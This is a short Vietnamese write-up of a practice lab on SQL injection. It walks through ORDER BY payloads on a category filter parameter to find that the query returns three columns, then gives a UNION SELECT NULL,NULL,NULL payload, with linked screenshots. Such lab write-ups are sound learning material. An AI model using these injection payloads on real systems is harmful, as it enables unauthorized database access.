# SQL injection UNION attack, determining the number of columns returned by the query

Bài này yêu cầu ta lấy dữ liệu bằng cách dùng `UNION`

Đầu tiên ta thử lần lượt pay load 
- `filter?category=' ORDER BY 1--`
- `filter?category=' ORDER BY 2--`
- `filter?category=' ORDER BY 3--`

![](https://cdn.discordapp.com/attachments/1124588087931043891/1133963396077846528/image.png)

- `filter?category=' ORDER BY 4--`( Tới đây thì web gặp lỗi, từ đó suy ra chỉ có 3 cột trong databases)

![](https://cdn.discordapp.com/attachments/1124588087931043891/1133963623094566983/image.png)

Để đọc dữ liệu từ 3 cột này ta chỉ cần chạy payload `filter?category=' UNION SELECT NULL,NULL,NULL--` 

![](https://cdn.discordapp.com/attachments/1124588087931043891/1133965103469957140/image.png)

